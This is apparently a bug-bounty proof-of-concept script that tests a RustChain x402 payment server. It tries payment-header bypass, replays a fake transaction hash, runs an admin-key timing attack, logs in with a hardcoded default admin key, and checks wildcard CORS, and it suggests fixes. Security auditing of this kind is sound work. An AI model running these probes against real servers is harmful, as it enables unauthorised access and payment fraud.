#!/usr/bin/env python3
"""
RustChain x402 Payment Protocol — Vulnerability PoC Suite
Bounty #66 | Auditor: @B1tor
RTC Wallet: RTC2fe3c33c77666ff76a1cd0999fd4466ee81250ff

Usage:
    python test_x402_vulns.py [--target http://localhost:8000]

Each test prints VULNERABLE or SAFE with details.
"""

import argparse
import hashlib
import hmac
import os
import sys
import time
import urllib.error
import urllib.request
import json

# ─── Config ───────────────────────────────────────────────────────────────────

DEFAULT_TARGET = os.environ.get("X402_TARGET", "http://localhost:8000")
KNOWN_ADMIN_DEFAULT = "rustchain_admin_key_2025_secure64"
PAID_ENDPOINT = "/api/v1/query"          # adjust to actual paid endpoint
ADMIN_ENDPOINT = "/api/v1/admin/status"  # adjust to actual admin endpoint

GREEN = "\033[92m"
RED   = "\033[91m"
YELLOW= "\033[93m"
RESET = "\033[0m"

def ok(msg):    print(f"  {GREEN}✓ SAFE{RESET}      {msg}")
def vuln(msg):  print(f"  {RED}✗ VULNERABLE{RESET} {msg}")
def info(msg):  print(f"  {YELLOW}ℹ{RESET}           {msg}")

def http_get(url, headers=None, timeout=5):
    req = urllib.request.Request(url, headers=headers or {})
    try:
        with urllib.request.urlopen(req, timeout=timeout) as resp:
            return resp.status, resp.read().decode(errors="replace")
    except urllib.error.HTTPError as e:
        return e.code, e.read().decode(errors="replace")
    except Exception as e:
        return None, str(e)

# ─── RC-01: Testnet Mode Always-Accept ────────────────────────────────────────

def test_rc01_testnet_always_accept(target):
    """
    CRITICAL: If X402_TESTNET=1 (the default), a malformed/garbage payment
    header should still return 200. We send clearly invalid base64 junk.
    A safe server returns 402; a vulnerable server returns 200.
    """
    print("\n[RC-01] Testnet Mode Always-Accept (CRITICAL)")
    url = target + PAID_ENDPOINT
    garbage_payment = "THIS_IS_NOT_A_VALID_PAYMENT_HEADER_xyzzy_$$$"

    status, body = http_get(url, {"X-PAYMENT": garbage_payment})
    if status is None:
        info(f"Could not connect to {url} — skipping (run against a live server)")
        return

    if status == 200:
        vuln(f"Server returned HTTP {status} for garbage payment header!")
        info("Likely cause: X402_TESTNET=1 is default, exceptions return valid:True")
        info("Fix: set X402_TESTNET=0 default; never return valid:True on exception")
    elif status == 402:
        ok(f"Server returned HTTP {status} — payment required as expected")
    else:
        info(f"Unexpected HTTP {status} — manual investigation needed")


# ─── RC-02: Payment Header Bypass ─────────────────────────────────────────────

def test_rc02_header_bypass(target):
    """
    HIGH: Send X-PAYMENT: fake and check if server grants access (200)
    without verifying the payment cryptographically.
    """
    print("\n[RC-02] Payment Header Bypass (HIGH)")
    url = target + PAID_ENDPOINT
    bypass_values = ["fake", "x", "1", "bypass", "true", "null"]

    any_bypass = False
    for val in bypass_values:
        status, body = http_get(url, {"X-PAYMENT": val})
        if status is None:
            info(f"Could not connect — skipping")
            return
        if status == 200:
            vuln(f"X-PAYMENT: '{val}' → HTTP 200! Header presence alone grants access.")
            any_bypass = True
            break

    if not any_bypass:
        # Check without header for baseline
        status_no_header, _ = http_get(url)
        if status_no_header == 402:
            ok("All bypass values returned 402 — header contents appear to be verified")
        else:
            info(f"Baseline (no header) returned {status_no_header} — endpoint may not require payment")


# ─── RC-03: Payment Replay Attack ─────────────────────────────────────────────

def test_rc03_payment_replay(target):
    """
    HIGH: Submit the same (fake) tx_hash N times and count how many succeed.
    A safe server should reject duplicates after the first use.

    In a real attack: obtain one valid tx_hash, replay it indefinitely.
    Here we simulate with a fixed fake hash and check for dedup errors.
    """
    print("\n[RC-03] Payment Replay Attack (HIGH)")
    url = target + PAID_ENDPOINT

    # Simulate a realistic-looking payment header with a fixed tx_hash
    fake_tx_hash = "0x" + hashlib.sha256(b"replay-test-bounty66").hexdigest()
    # Minimal x402-like JSON payload (real format varies by implementation)
    payment_payload = json.dumps({
        "tx_hash": fake_tx_hash,
        "amount": "1",
        "currency": "RTC",
        "timestamp": int(time.time()) - 10,
    })

    successes = 0
    attempts = 5
    for i in range(attempts):
        status, body = http_get(url, {"X-PAYMENT": payment_payload})
        if status is None:
            info("Could not connect — skipping")
            return
        if status == 200:
            successes += 1

    if successes == 0:
        ok(f"0/{attempts} replays succeeded (server rejects unverified payments)")
    elif successes == 1:
        info(f"1/{attempts} succeeded — check if dedup applies after first verified use")
    else:
        vuln(f"{successes}/{attempts} replay attempts succeeded!")
        info(f"tx_hash used: {fake_tx_hash}")
        info("Fix: maintain spent-tx cache; reject duplicate tx_hash values")


# ─── RC-04: Admin Key Timing Attack ───────────────────────────────────────────

def test_rc04_timing_attack(target):
    """
    MEDIUM: Measure response time difference between a wrong key starting
    with the correct prefix vs. a completely wrong key.
    A constant-time comparison (hmac.compare_digest) shows ~0 difference.
    A naive != comparison leaks timing proportional to common prefix length.
    """
    print("\n[RC-04] Admin Key Timing Attack (MEDIUM)")
    url = target + ADMIN_ENDPOINT
    iterations = 30

    def measure(key):
        times = []
        for _ in range(iterations):
            t0 = time.perf_counter()
            http_get(url, {"X-Admin-Key": key})
            times.append(time.perf_counter() - t0)
        times.sort()
        # Use median of middle half to reduce outlier noise
        mid = times[iterations//4 : 3*iterations//4]
        return sum(mid) / len(mid)

    # Key that shares long prefix with default
    prefix_key   = KNOWN_ADMIN_DEFAULT[:20] + "X" * (len(KNOWN_ADMIN_DEFAULT) - 20)
    # Completely wrong key
    wrong_key    = "A" * len(KNOWN_ADMIN_DEFAULT)

    status, _ = http_get(url, {"X-Admin-Key": wrong_key})
    if status is None:
        info(f"Could not connect to {url} — skipping")
        return

    info(f"Measuring timing over {iterations} requests per candidate key…")
    t_prefix = measure(prefix_key)
    t_wrong  = measure(wrong_key)
    diff_ms  = abs(t_prefix - t_wrong) * 1000

    info(f"Prefix-match key avg: {t_prefix*1000:.2f}ms")
    info(f"Wrong key avg:        {t_wrong*1000:.2f}ms")
    info(f"Difference:           {diff_ms:.2f}ms")

    if diff_ms > 2.0:
        vuln(f"{diff_ms:.2f}ms timing difference detected — likely non-constant-time comparison")
        info("Fix: use hmac.compare_digest(a.encode(), b.encode())")
    else:
        ok(f"Timing difference {diff_ms:.2f}ms — within noise threshold, likely constant-time")


# ─── RC-05: Hardcoded Admin Key Default ───────────────────────────────────────

def test_rc05_hardcoded_key(target):
    """
    MEDIUM: Try the publicly known default admin key.
    If it works, the deployment never set RC_ADMIN_KEY.
    """
    print("\n[RC-05] Hardcoded Admin Key Default (MEDIUM)")
    url = target + ADMIN_ENDPOINT

    status, body = http_get(url, {"X-Admin-Key": KNOWN_ADMIN_DEFAULT})
    if status is None:
        info(f"Could not connect to {url} — skipping")
        return

    if status == 200:
        vuln(f"Default key '{KNOWN_ADMIN_DEFAULT}' accepted! RC_ADMIN_KEY env var not set.")
        info("Fix: remove default; raise EnvironmentError if RC_ADMIN_KEY is unset")
    elif status in (401, 403):
        ok(f"HTTP {status} — default key rejected, RC_ADMIN_KEY appears to be customized")
    else:
        info(f"HTTP {status} — unexpected response; manual check needed")
        info(f"Response: {body[:200]}")


# ─── RC-06: Wildcard CORS ─────────────────────────────────────────────────────

def test_rc06_wildcard_cors(target):
    """
    LOW: Check CORS headers on payment endpoints.
    Access-Control-Allow-Origin: * on endpoints accepting X-PAYMENT is dangerous.
    """
    print("\n[RC-06] Wildcard CORS on Payment Endpoints (LOW)")
    url = target + PAID_ENDPOINT

    req = urllib.request.Request(url, method="OPTIONS")
    req.add_header("Origin", "https://evil.example.com")
    req.add_header("Access-Control-Request-Headers", "X-PAYMENT")
    try:
        with urllib.request.urlopen(req, timeout=5) as resp:
            acao = resp.headers.get("Access-Control-Allow-Origin", "")
            acah = resp.headers.get("Access-Control-Allow-Headers", "")
    except urllib.error.HTTPError as e:
        acao = e.headers.get("Access-Control-Allow-Origin", "")
        acah = e.headers.get("Access-Control-Allow-Headers", "")
    except Exception as ex:
        info(f"Could not connect — skipping ({ex})")
        return

    info(f"Access-Control-Allow-Origin: {acao or '(not set)'}")
    info(f"Access-Control-Allow-Headers: {acah or '(not set)'}")

    if acao == "*":
        vuln("ACAO: * — any origin can read payment endpoint responses")
        if "x-payment" in acah.lower() or "authorization" in acah.lower():
            vuln("Wildcard CORS combined with sensitive header allowlist is especially risky")
        info("Fix: restrict to known origins (e.g., https://app.rustchain.io)")
    elif acao:
        ok(f"ACAO is restricted to: {acao}")
    else:
        ok("No CORS headers present on OPTIONS — cross-origin access not enabled")


# ─── Static code checks (no live server needed) ───────────────────────────────

def test_static_checks():
    """
    Check local source files for known-bad patterns.
    Run from the repository root.
    """
    print("\n[STATIC] Source Code Pattern Checks")

    checks = [
        ("RC-01", 'X402_TESTNET", "1"',   "Testnet default is '1'",       "fleet_immune_system.py / mcp_server.py"),
        ("RC-05", KNOWN_ADMIN_DEFAULT,     "Hardcoded admin key in source", "fleet_immune_system.py"),
    ]

    import subprocess
    for rid, pattern, desc, hint in checks:
        try:
            result = subprocess.run(
                ["grep", "-r", "--include=*.py", "-l", pattern, "."],
                capture_output=True, text=True, timeout=10
            )
            if result.stdout.strip():
                files = result.stdout.strip().split("\n")
                vuln(f"[{rid}] {desc} — found in: {', '.join(files)}")
            else:
                ok(f"[{rid}] Pattern not found in source: {pattern[:40]}")
        except FileNotFoundError:
            info("grep not available — skipping static checks")
            break
        except subprocess.TimeoutExpired:
            info("Static check timed out")
            break


# ─── Main ─────────────────────────────────────────────────────────────────────

def main():
    parser = argparse.ArgumentParser(description="RustChain x402 Vuln PoC Suite — Bounty #66")
    parser.add_argument("--target", default=DEFAULT_TARGET, help="Base URL of target server")
    parser.add_argument("--static-only", action="store_true", help="Only run static code checks")
    args = parser.parse_args()

    print("=" * 60)
    print(" RustChain x402 Vulnerability PoC Suite")
    print(" Bounty #66 | Auditor: @B1tor")
    print(f" Target: {args.target}")
    print("=" * 60)

    if not args.static_only:
        test_rc01_testnet_always_accept(args.target)
        test_rc02_header_bypass(args.target)
        test_rc03_payment_replay(args.target)
        test_rc04_timing_attack(args.target)
        test_rc05_hardcoded_key(args.target)
        test_rc06_wildcard_cors(args.target)

    test_static_checks()

    print("\n" + "=" * 60)
    print(" Scan complete. See security/x402-red-team-report.md for")
    print(" full details and remediation guidance.")
    print("=" * 60)


if __name__ == "__main__":
    main()
